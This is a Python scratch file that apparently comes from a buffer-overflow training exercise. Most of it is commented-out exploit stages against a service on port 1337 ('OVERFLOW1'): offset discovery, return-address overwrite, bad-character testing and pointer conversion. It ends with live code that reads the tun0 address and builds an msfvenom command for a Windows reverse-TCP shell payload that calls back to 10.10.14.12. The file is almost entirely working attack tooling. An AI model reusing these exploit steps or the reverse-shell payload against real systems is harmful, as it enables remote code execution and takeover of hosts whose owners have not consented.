# import sys, socket
# from time import sleep
# prefix = "OVERFLOW1 "
# pattern = ""
# ip = "10.10.182.2"
# port = 1337
# def get_offset(prefix, pattern, ip, port):
#
#         try:
#             payload = prefix + pattern
#             s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#             s.connect((ip, port))
#             s.send((payload.encode()))
#             s.close()
#
#         except:
#             print("Error connecting to server")
#             sys.exit()
#
# get_offset(prefix,pattern,ip,port)


#
# import sys , socket
# from time import sleep
# ip = "10.10.180.123"
# port = 1337
# prefix = "OVERFLOW1 "
# offset = 1978
# retn = 'B' * 4
# padding = ""
# postfix = ""
#
#
# badchars = ""
#
#
#
# # 2003 is the number of bytes received by running offset.py
#
# shellcode = 'A' * offset + retn + padding + badchars + postfix
# #shellcode = 'A' * 1974 + badchars
#
# while True:
#         try:
#             payload = prefix + shellcode
#             s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             s.settimeout(5)
#             s.connect((ip, port))
#             s.recv(1024)
#             s.send((bytes(payload, "latin-1")))
#             s.recv(1024)
#             s.close()
#
#         except:
#             print("Error connecting to server")
#             sys.exit()





# import socket
#
# ip = "10.10.182.2"
# port = 1337
#
# prefix = "OVERFLOW1 "
# offset = 1978
# overflow = "A" * offset
# retn = ""
# padding = ""
# payload = ""
# postfix = ""
#
# buffer = prefix + overflow + retn + padding + payload + postfix
#
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#
# try:
#   s.connect((ip, port))
#   print("Sending evil buffer...")
#   s.send(bytes(buffer + "\r\n", "latin-1"))
#   print("Done!")
# except:
#   print("Could not connect.")

#
#
# import sys , socket
# from time import sleep
# ip = "10.10.206.162"
# port = 1337
# prefix = "OVERFLOW1 /.:/"
# offset = 1974
# retn = 'B' * 4
# padding = ""
# postfix = ""
#
#
# badchars = ""
#
#
#
# # 2003 is the number of bytes received by running offset.py
#
# shellcode = 'A' * offset + retn + padding + badchars + postfix
# #shellcode = 'A' * 1974 + badchars
#
# while True:
#         try:
#             payload = prefix + shellcode
#             print(type(badchars))
#             print(bytes(payload, "latin-1"))
#             s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             s.settimeout(5)
#             s.connect((ip, port))
#             s.recv(1024)
#             s.send((bytes(payload, "latin-1")))
#             s.recv(1024)
#             s.close()
#
#         except:
#             print("Error connecting to server")
#             sys.exit()

# n=2
# p ="62501205"
# out = [(p[i:i+n]) for i in range(0, len(p), n)]
# out.reverse()
# pointer = ""
# for i in out:
#     pointer +=f"\\x{i}"
#
#
# def convertStringToHex(string):
#     return bytes(string, "utf-8").decode("unicode_escape")
#
#
# pp = convertStringToHex(pointer)
# print(type(pp))
# print(pp)
import os

print(os.popen("ifconfig tun0 | grep inet | head -n 1 | tr -s ' ' | cut -d ' ' -f 3").read())

host = os.popen("ifconfig tun0 | grep inet | head -n 1 | tr -s ' ' | cut -d ' ' -f 3").read()
cmd = "msfvenom -p windows/shell/reverse_tcp lhost=10.10.14.12 lport=12000 -b '\x00' -f c"